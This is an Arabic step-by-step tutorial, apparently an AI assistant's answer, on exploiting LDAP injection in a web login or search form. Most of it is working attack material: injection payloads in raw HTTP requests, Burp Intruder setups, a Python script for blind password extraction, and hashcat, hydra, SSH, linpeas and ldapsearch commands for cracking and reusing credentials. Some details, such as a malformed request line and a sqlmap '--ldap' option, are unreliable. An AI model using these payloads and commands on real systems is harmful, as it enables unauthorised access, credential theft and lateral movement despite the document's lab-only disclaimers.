لتوضيح **ثغرة LDAP Injection** وتقديم **أمثلة عملية** لكل خطوة في عملية الاستغلال، سأشرح الخطوات الست الشائعة لاستغلال هذه الثغرة مع أمثلة عملية لكل خطوة. سأستخدم لغة عربية واضحة، مع التركيز على تطبيقات عملية باستخدام أدوات مثل **Burp Suite** و**Python**، مع افتراض أنك تختبر في بيئة قانونية (مثل معمل TryHackMe أو HackTheBox أو موقع لديك إذن باختباره). سأوضح كل خطوة بمثال عملي يمكن تطبيقه على موقع ويب يحتوي على نموذج تسجيل دخول أو بحث يتفاعل مع خادم LDAP.

---

## نظرة عامة على LDAP Injection
**LDAP Injection** هي ثغرة تحدث عندما يسمح تطبيق ويب بإدخال بيانات غير مصفاة إلى استعلامات LDAP، مما يتيح للمهاجم التلاعب بالاستعلامات لاستخراج بيانات، تجاوز التحقق من الهوية، أو تنفيذ هجمات أخرى. الخطوات الشائعة لاستغلال هذه الثغرة هي:

1. **اكتشاف ثغرة LDAP Injection**.
2. **اختبار الاستغلال الأعمى (Blind Exploitation)**.
3. **اكتشاف الخصائص الصالحة (Valid Attributes)**.
4. **جمع المعلومات عن المستخدمين أو الكائنات**.
5. **أتمتة الاختبار باستخدام السكربتات**.
6. **استغلال خاصية `userPassword` (تأكيد القيم، كسر التشفير، توسيع الهجوم)**.

سأقدم مثالًا عمليًا لكل خطوة، مع تفاصيل حول الإدخال، الأدوات، والنتائج المتوقعة.

---

### الخطوة 1: اكتشاف ثغرة LDAP Injection
**الهدف**: تحديد ما إذا كان حقل إدخال (مثل نموذج تسجيل الدخول أو البحث) يتفاعل مع خادم LDAP ويتأثر بمدخلات غير مصفاة.

**مثال عملي**:
- **السيناريو**: تختبر موقعًا (`http://example.com`) يحتوي على نموذج تسجيل دخول. حقل اسم المستخدم هو `username` وحقل كلمة المرور هو `password`.
- **الأدوات**: Burp Suite (للتقاط وتعديل الطلبات).
- **الإجراء**:
  1. افتح المتصفح، اضبط الوكيل إلى Burp Suite (`127.0.0.1:8080`).
  2. حاول تسجيل الدخول باستخدام مدخلات تحتوي على أحرف خاصة LDAP مثل `*` أو `)`:
     - Username: `*`
     - Password: `anything`
     - أرسل الطلب عبر Burp Suite Repeater:
       ```
       POST /login HTTP/1.1
       Host: example.com
       Content-Type: application/x-www-form-urlencoded

       username=*&password=anything
       ```
  3. راقب الاستجابة. إذا كانت مختلفة (مثل رمز حالة HTTP 200 بدلاً من 403 أو نص مثل "Invalid credentials" يتغير)، فهذا يشير إلى تفاعل مع LDAP.
  4. جرب مدخلًا آخر:
     - Username: `admin*`
     - Password: `anything`
     - طلب:
       ```
       POST /login HTTP/1.1
       Host: example.com
       Content-Type: application/x-www-form-urlencoded

       username=admin*&password=anything
       ```
  5. إذا أعادت الاستجابة نتائج (مثل "User found" أو صفحة مختلفة)، فهذا يؤكد وجود ثغرة LDAP Injection.

- **النتيجة المتوقعة**:
  - الاستجابة لـ `username=*` تعيد رمز 200 أو نصًا مثل "Multiple users found"، مما يشير إلى أن `*` يطابق جميع المستخدمين.
  - الاستجابة لـ `admin*` تعيد "User found"، مما يؤكد أن التطبيق يمرر المدخلات إلى استعلام LDAP دون تصفية.
- **الأوامر/الإجراءات**:
  - في Burp Suite Repeater، أرسل الطلبات أعلاه.
  - سجّل الاستجابات (مثل رمز الحالة، طول الاستجابة، أو النص) لتحديد التغييرات.

---

### الخطوة 2: اختبار الاستغلال الأعمى (Blind Exploitation)
**الهدف**: تخمين بيانات (مثل كلمات المرور أو أسماء المستخدمين) حرفًا بحرفًا بناءً على استجابات التطبيق.

**مثال عملي**:
- **السيناريو**: لاحظت أن إدخال `*` في حقل البحث (`http://example.com?action=dir&search=`) يعيد نتائج، مما يؤكد LDAP Injection. تريد تخمين كلمة مرور مستخدم `admin`.
- **الأدوات**: Burp Suite Repeater أو Intruder.
- **الإجراء**:
  1. اختبر استعلامًا لتخمين الحرف الأول من `userPassword`:
     - Search: `admin*)(userPassword=A*`
     - طلب:
       ```
       GET /action=dir&search=admin*)(userPassword=A* HTTP/1.1
       Host: example.com
       ```
  2. كرر لأحرف أخرى (`B*`, `C*`, ..., `Z*`) باستخدام Burp Intruder:
     - في Intruder، اضبط الموضع إلى `userPassword=<payload>*`.
     - استخدم قائمة أحرف: `A,B,C,...,Z,a,b,c,...,z,0,1,...,9`.
     - أرسل الطلبات وراقب الاستجابات.
  3. إذا أعادت `userPassword=M*` استجابة إيجابية (مثل نص "Result found" أو رمز 200)، فالحرف الأول هو `M`.
  4. اختبر الحرف الثاني:
     - Search: `admin*)(userPassword=MA*`
     - طلب:
       ```
       GET /action=dir&search=admin*)(userPassword=MA* HTTP/1.1
       Host: example.com
       ```
  5. كرر حتى تستخلص القيمة الكاملة (مثل `MYKE`).

- **النتيجة المتوقعة**:
  - `userPassword=M*` يعيد رمز 200 ونص "Result found".
  - `userPassword=MA*` يعيد نفس الاستجابة، مما يؤكد الحرف الثاني `A`.
  - بعد عدة محاولات، تحصل على `MYKE` ككلمة المرور.
- **الأوامر/الإجراءات**:
  - في Burp Intruder، استخدم قائمة أحرف (`A-Z`, `a-z`, `0-9`) واضبط الموضع:
    ```
    admin*)(userPassword=§A§*)
    ```
  - راجع الاستجابات لتحديد الحرف الصحيح بناءً على طول الاستجابة أو النص.

---

### الخطوة 3: اكتشاف الخصائص الصالحة (Valid Attributes)
**الهدف**: تحديد الخصائص المدعومة في الدليل (مثل `uid`, `cn`, `userPassword`) لاستهدافها.

**مثال عملي**:
- **السيناريو**: تريد معرفة ما إذا كانت خاصية `userPassword` أو `mail` مدعومة في نموذج تسجيل الدخول.
- **الأدوات**: Burp Suite Repeater.
- **الإجراء**:
  1. أدخل استعلامًا لاختبار خاصية `userPassword`:
     - Username: `*)(userPassword=*)`
     - Password: `anything`
     - طلب:
       ```
       POST /login HTTP/1.1
       Host: example.com
       Content-Type: application/x-www-form-urlencoded

       username=*)(userPassword=*)&password=anything
       ```
  2. إذا أعادت الاستجابة رمز 200 أو نصًا مثل "User exists"، فـ `userPassword` مدعومة.
  3. كرر لخصائص أخرى (مثل `cn`, `mail`, `sn`):
     - Username: `*)(cn=*)`
     - طلب:
       ```
       POST /login HTTP/1.1
       Host: example.com
       Content-Type: application/x-www-form-urlencoded

       username=*)(cn=*)&password=anything
       ```
  4. سجّل الخصائص التي تعيد استجابات إيجابية (مثل `userPassword`, `cn`, `mail`).

- **النتيجة المتوقعة**:
  - `*)(userPassword=*)` يعيد رمز 200 ونص "User exists"، مما يؤكد دعم `userPassword`.
  - `*)(cn=*)` يعيد نفس الاستجابة، مما يؤكد دعم `cn`.
  - `*)(xyz=*)` يعيد رمز 403 أو "Invalid"، مما يشير إلى أن `xyz` غير مدعوم.
- **الأوامر/الإجراءات**:
  - في Burp Suite Repeater، أرسل الطلبات لكل خاصية.
  - استخدم قائمة خصائص شائعة:
    ```
    uid, cn, sn, userPassword, mail, givenName, objectClass
    ```
  - سجّل الخصائص الصالحة لاستخدامها في الخطوات التالية.

---

### الخطوة 4: جمع المعلومات عن المستخدمين أو الكائنات
**الهدف**: استخراج معلومات عن المستخدمين (مثل أسماء المستخدمين أو عناوين البريد) باستخدام الخصائص الصالحة.

**مثال عملي**:
- **السيناريو**: لاحظت أن خاصية `mail` مدعومة. تريد تخمين عناوين بريد لمستخدمين مثل `admin` أو `user1`.
- **الأدوات**: Burp Suite Repeater.
- **الإجراء**:
  1. اختبر استعلامًا لتخمين بريد `admin`:
     - Username: `*)(mail=admin@domain.com)`
     - Password: `anything`
     - طلب:
       ```
       POST /login HTTP/1.1
       Host: example.com
       Content-Type: application/x-www-form-urlencoded

       username=*)(mail=admin@domain.com)&password=anything
       ```
  2. إذا أعادت الاستجابة رمز 200 أو "User found"، فالبريد `admin@domain.com` موجود.
  3. جرب أسماء مستخدمين شائعة (مثل `user1`, `administrator`):
     - Username: `*)(mail=user1@domain.com)`
     - طلب:
       ```
       POST /login HTTP/1.1
       Host: example.com
       Content-Type: application/x-www-form-urlencoded

       username=*)(mail=user1@domain.com)&password=anything
       ```
  4. كرر باستخدام قائمة أسماء مستخدمين (مثل `admin, user1, guest`) في Burp Intruder.

- **النتيجة المتوقعة**:
  - `mail=admin@domain.com` يعيد "User found"، مما يؤكد وجود المستخدم.
  - `mail=user1@domain.com` يعيد "Invalid"، مما يشير إلى عدم وجود المستخدم.
  - تحصل على قائمة بأسماء المستخدمين الصالحين (مثل `admin@domain.com`, `administrator@domain.com`).
- **الأوامر/الإجراءات**:
  - في Burp Intruder، استخدم قائمة بريد (مثل `admin@domain.com`, `user1@domain.com`) واضبط الموضع:
    ```
    *)(mail=§admin@domain.com§)
    ```
  - راجع الاستجابات لتحديد العناوين الصالحة.

---

### الخطوة 5: أتمتة الاختبار باستخدام السكربتات
**الهدف**: أتمتة تخمين الخصائص الصالحة أو الاستغلال الأعمى لتوفير الوقت.

**مثال عملي**:
- **السيناريو**: تريد أتمتة تخمين كلمة مرور `userPassword` لمستخدم `admin` باستخدام الاستغلال الأعمى.
- **الأدوات**: Python مع مكتبة `requests`.
- **الإجراء**:
  1. أنشئ سكربت Python لتخمين `userPassword` حرفًا بحرفًا:
     ```python
     #!/usr/bin/python3
     import requests
     import string
     alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

     flag = ""
     url = "http://example.com?action=dir&search="
     for i in range(20):  # الحد الأقصى لطول كلمة المرور
         print("[i] Looking for character " + str(i + 1))
         for char in alphabet:
             payload = "admin*)(userPassword=" + flag + char + "*"
             r = requests.get(url + payload)
             if "Result found" in r.text:  # شرط النجاح
                 flag += char
                 print("[+] Flag: " + flag)
                 break
     ```
  2. احفظ السكربت كـ `blind_injection.py`.
  3. شغّل السكربت:
     ```
     python3 blind_injection.py
     ```
  4. راقب المخرجات للحصول على كلمة المرور (مثل `MYKE`).

- **النتيجة المتوقعة**:
  - السكربت يطبع:
    ```
    [i] Looking for character 1
    [+] Flag: M
    [i] Looking for character 2
    [+] Flag: MY
    [i] Looking for character 3
    [+] Flag: MYK
    [i] Looking for character 4
    [+] Flag: MYKE
    ```
  - تحصل على كلمة المرور `MYKE`.
- **الأوامر/الإجراءات**:
  - قم بتثبيت `requests`: `pip install requests`
  - عدّل `url` و`"Result found"` بناءً على الموقع وشرط النجاح.
  - شغّل السكربت وراقب الطلبات في Burp Suite.

---

### الخطوة 6: استغلال خاصية `userPassword` (تأكيد القيم، كسر التشفير، توسيع الهجوم)
**الهدف**: تأكيد كلمة المرور المستخلصة، كسر أي تشفير، واستخدام القيمة للوصول إلى النظام أو أنظمة أخرى.

**مثال عملي**:
- **السيناريو**: استخلصت كلمة مرور `MYKE` لمستخدم `administrator` أو هاش `{SHA}2cM6...`. تريد تأكيدها، كسر الهاش إذا لزم الأمر، وتوسيع الهجوم.
- **الأدوات**: Burp Suite، Hashcat، Python، Hydra.
- **الإجراء**:
  1. **تأكيد كلمة المرور**:
     - أدخل في نموذج تسجيل الدخول:
       - Username: `administrator`
       - Password: `MYKE`
     - طلب:
       ```
       POST /login HTTP/1.1
       Host: example.com
       Content-Type: application/x-www-form-urlencoded

       username=administrator&password=MYKE
       ```
     - إذا نجح (مثل رمز 302 أو "Welcome")، فكلمة المرور صحيحة.
  2. **كسر الهاش (إذا كانت القيمة مشفرة)**:
     - لنفترض أن القيمة هي `{SHA}2cM6...`.
     - احفظ الهاش في `hash.txt`:
       ```
       2cM6...
       ```
     - شغّل Hashcat:
       ```
       hashcat -m 100 hash.txt /path/to/rockyou.txt
       ```
     - إذا نجح، تحصل على النص العادي (مثل `MYKE`).
  3. **اختبار كلمة المرور في خدمات أخرى**:
     - جرب `MYKE` في خادم IMAP:
       ```
       hydra -l administrator@domain.com -p MYKE imap://mail.domain.com
       ```
     - إذا نجح، تحصل على وصول إلى البريد.
  4. **توسيع الهجوم**:
     - بعد تسجيل الدخول إلى لوحة التحكم (`http://example.com/dashboard`)، تصفح `/admin/users`.
     - استخرج قائمة المستخدمين أو الملفات الحساسة.
     - إذا كنت في خادم عبر SSH (بعد اختبار `ssh administrator@target_ip` مع `MYKE`):
       ```
       sudo -l
       ./linpeas.sh
       ```
     - استخدم `ldapsearch` إذا كان لديك وصول إلى LDAP:
       ```
       ldapsearch -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE -b "dc=domain,dc=com" "(objectClass=*)"
       ```

- **النتيجة المتوقعة**:
  - تسجيل الدخول بـ `administrator:MYKE` يعيد رمز 302 ولوحة تحكم.
  - Hashcat يكسر `{SHA}2cM6...` إلى `MYKE`.
  - Hydra تؤكد نجاح `MYKE` في IMAP، مما يمنح وصولًا إلى البريد.
  - التصفح يكشف عن قائمة مستخدمين في `/admin/users`.
  - `ldapsearch` يستخرج كائنات إضافية (مثل `user1`, `guest`).
- **الأوامر/الإجراءات**:
  - في Burp Suite، أرسل طلب تسجيل الدخول.
  - شغّل Hashcat لحل الهاش:
    ```
    hashcat -m 100 hash.txt /path/to/rockyou.txt
    ```
  - استخدم Hydra لاختبار IMAP:
    ```
    hydra -l administrator@domain.com -p MYKE imap://mail.domain.com
    ```
  - تصفح النظام أو شغّل `ldapsearch` لتوسيع الهجوم.

---

## نصائح عامة لتطبيق الأمثلة
1. **اختبار يدوي أولاً**:
   - استخدم Burp Suite Repeater لاختبار المدخلات يدويًا قبل الأتمتة.
   - مثال: اختبر `username=*` لتأكيد LDAP Injection.
2. **استخدام Burp Intruder للأتمتة الجزئية**:
   - في الخطوات 2 و3، استخدم Intruder لاختبار قوائم أحرف أو خصائص.
   - مثال: اضبط الموضع إلى `userPassword=§A§*` مع قائمة `A-Z`.
3. **ضبط شروط النجاح**:
   - حدد شرط النجاح بدقة (مثل نص "Result found" أو رمز 200).
   - مثال: في السكربت، استبدل `"Result found"` بنص الاستجابة الفعلي.
4. **إدارة الأخطاء**:
   - أضف معالجة الأخطاء في السكربتات:
     ```python
     try:
         r = requests.get(url + payload)
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
         continue
     ```
5. **الأمان**:
   - اختبر فقط في بيئات قانونية (مثل TryHackMe أو مواقع مرخصة).
   - تجنب إرسال طلبات مكثفة قد تؤثر على الموقع.

---

## ملخص الأمثلة العملية لكل خطوة
| **الخطوة**                    | **الهدف**                      | **مثال عملي**                                     | **الأدوات**                | **الأوامر/الإجراءات**                                                                          |
| ----------------------------- | ------------------------------ | ------------------------------------------------- | -------------------------- | ---------------------------------------------------------------------------------------------- |
| **1. اكتشاف الثغرة**          | تحديد وجود LDAP Injection      | إدخال `*` في حقل تسجيل الدخول يعيد استجابة مختلفة | Burp Suite                 | `POST /login` مع `username=*&password=anything`                                                |
| **2. الاستغلال الأعمى**       | تخمين كلمة المرور              | تخمين `userPassword=M*` يعيد "Result found"       | Burp Suite Intruder        | `GET /action=dir&search=admin*)(userPassword=M*`                                               |
| **3. اكتشاف الخصائص**         | تحديد خصائص مثل `userPassword` | `*)(userPassword=*)` يعيد رمز 200                 | Burp Suite Repeater        | `POST /login` مع `username=*)(userPassword=*)`                                                 |
| **4. جمع المعلومات**          | استخراج عناوين بريد            | `*)(mail=admin@domain.com)` يعيد "User found"     | Burp Suite Intruder        | `POST /login` مع `username=*)(mail=admin@domain.com)`                                          |
| **5. أتمتة الاختبار**         | أتمتة تخمين `userPassword`     | سكربت Python يستخلص `MYKE`                        | Python                     | `python3 blind_injection.py`                                                                   |
| **6. استغلال `userPassword`** | تأكيد وتوسيع الهجوم            | تسجيل دخول بـ `MYKE`, كسر هاش, اختبار IMAP        | Burp Suite, Hashcat, Hydra | `POST /login` مع `username=administrator&password=MYKE`, `hashcat -m 100 hash.txt rockyou.txt` |

---

## ماذا لو لم تنجح الأمثلة؟
- **تحقق من الحقل**: تأكد أن حقل الإدخال (مثل `username` أو `search`) يتفاعل مع LDAP.
  - مثال: جرب `?search=*` إذا فشل حقل تسجيل الدخول.
- **تحقق من الاستجابات**: إذا كانت الاستجابات غامضة، قارن طول الاستجابة أو الوقت.
  - مثال: في Burp Suite، راجع `Length` في Intruder.
- **جرب مدخلات أخرى**: إذا فشل `*`, جرب `admin)` أو `)(`.
  - مثال: `username=admin)` في Repeater.
- **استخدم أدوات بديلة**: إذا فشل السكربت، استخدم Burp Intruder أو أدوات مثل sqlmap (مع ملحقات LDAP).
  - مثال: `sqlmap -u "http://example.com?action=dir&search=*" --ldap`.

---

## ملاحظات نهائية
- **الهدف**: استغلال ثغرة LDAP Injection عبر الخطوات الست لاستخراج بيانات حساسة مثل كلمات المرور.
- **الأدوات**: Burp Suite للاختبار اليدوي والجزئي، Python للأتمتة، Hashcat/Hydra لتوسيع الهجوم.
- **الأمثلة**:
  - اكتشاف الثغرة باستخدام `*`.
  - الاستغلال الأعمى لتخمين `MYKE`.
  - اكتشاف خصائص مثل `userPassword`.
  - جمع عناوين بريد مثل `admin@domain.com`.
  - أتمتة التخمين بسكربت Python.
  - تأكيد `MYKE` وتوسيع الهجوم عبر IMAP أو LDAP.
- **الفحص**: تحقق من الاستجابات في كل خطوة (رمز الحالة، النص، الطول).
- **الأمان**: اختبر فقط في بيئات قانونية لتجنب المشكلات القانونية.

إذا كنت بحاجة إلى تفاصيل إضافية حول خطوة معينة، تطبيق مثال على موقع معين، أو مساعدة في إعداد الأدوات، أخبرني وسأساعدك!